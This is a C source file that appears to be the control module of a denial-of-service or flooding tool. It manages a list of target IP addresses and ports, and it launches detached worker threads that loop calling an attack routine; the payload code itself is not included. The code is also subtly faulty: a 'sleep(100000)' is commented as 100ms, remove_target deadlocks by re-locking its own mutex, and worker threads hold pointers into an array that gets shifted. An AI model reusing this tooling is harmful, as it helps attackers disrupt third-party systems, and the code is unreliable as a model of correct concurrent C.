#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include "network.h"
#include "attack.h"

static Target targets[MAX_TARGETS];
static int target_count = 0;
static pthread_mutex_t target_mutex = PTHREAD_MUTEX_INITIALIZER;

int init_network(void) {
    pthread_mutex_init(&target_mutex, NULL);
    target_count = 0;
    printf("Network module initialized\n");
    return 0;
}

void cleanup_network(void) {
    pthread_mutex_destroy(&target_mutex);
    printf("Network module cleaned up\n");
}

int add_target(const char* ip, int port, AttackType type, int threads) {
    pthread_mutex_lock(&target_mutex);
    
    if (target_count >= MAX_TARGETS) {
        pthread_mutex_unlock(&target_mutex);
        return -1; // Target list full
    }
    
    if (!validate_ip(ip) || !validate_port(port)) {
        pthread_mutex_unlock(&target_mutex);
        return -2; // Invalid IP or port
    }
    
    Target* t = &targets[target_count];
    strncpy(t->ip, ip, sizeof(t->ip) - 1);
    t->ip[sizeof(t->ip) - 1] = '\0';
    t->port = port;
    t->attack_type = type;
    t->thread_count = threads;
    t->running = 0;
    
    target_count++;
    pthread_mutex_unlock(&target_mutex);
    
    printf("Target added: %s:%d (Attack: %s, Threads: %d)\n",  ip, port, get_attack_name(type), threads);
    return target_count - 1; // Return index of added target
}

int remove_target(int index) {
    pthread_mutex_lock(&target_mutex);
    
    if (index < 0 || index >= target_count) {
        pthread_mutex_unlock(&target_mutex);
        return -1; // Invalid index
    }
    
    // Stop attack if running
    if (targets[index].running) {
        stop_attack_on_target(index);
    }
    
    // Shift targets to fill gap
    for (int i = index; i < target_count - 1; i++) {
        targets[i] = targets[i + 1];
    }
    
    target_count--;
    pthread_mutex_unlock(&target_mutex);
    
    printf("Target removed at index %d\n", index);
    return 0;
}

void start_attack_on_target(int index) {
    pthread_mutex_lock(&target_mutex);
    
    if (index < 0 || index >= target_count) {
        pthread_mutex_unlock(&target_mutex);
        return;
    }
    
    Target* t = &targets[index];
    if (t->running) {
        pthread_mutex_unlock(&target_mutex);
        return; // Attack already running
    }
    
    t->running = 1;
    pthread_mutex_unlock(&target_mutex);
    
    // Create attack threads
    pthread_t* threads = malloc(sizeof(pthread_t) * t->thread_count);
    if (threads) {
        for (int i = 0; i < t->thread_count; i++) {
            if (pthread_create(&threads[i], NULL, attack_worker, t) != 0) {
                printf("Failed to create attack thread %d for target %s\n", i, t->ip);
            }
        }
        
        // Detach threads to allow them to run independently
        for (int i = 0; i < t->thread_count; i++) {
            pthread_detach(threads[i]);
        }
        
        free(threads);
    }
    
    printf("Attack started on target %s:%d\n", t->ip, t->port);
}

void stop_attack_on_target(int index) {
    pthread_mutex_lock(&target_mutex);
    
    if (index < 0 || index >= target_count) {
        pthread_mutex_unlock(&target_mutex);
        return;
    }
    
    targets[index].running = 0;
    pthread_mutex_unlock(&target_mutex);
    
    printf("Attack stopped on target %s:%d\n", targets[index].ip, targets[index].port);
}

void* attack_worker(void* arg) {
    Target* target = (Target*)arg;
    
    while (target->running) {
        // Execute the attack
        start_attack(target->attack_type, target);
        
        // Sleep for a short time to prevent excessive CPU usage
        sleep(100000); // 100ms
    }
    
    return NULL;
}

int validate_ip(const char* ip) {
    // Basic IP validation (simplified)
    if (!ip) return 0;
    
    int a, b, c, d;
    return sscanf(ip, "%d.%d.%d.%d", &a, &b, &c, &d) == 4 &&
        a >= 0 && a <= 255 && b >= 0 && b <= 255 &&
        c >= 0 && c <= 255 && d >= 0 && d <= 255;
}

int validate_port(int port) {
    return port > 0 && port <= 65535;
}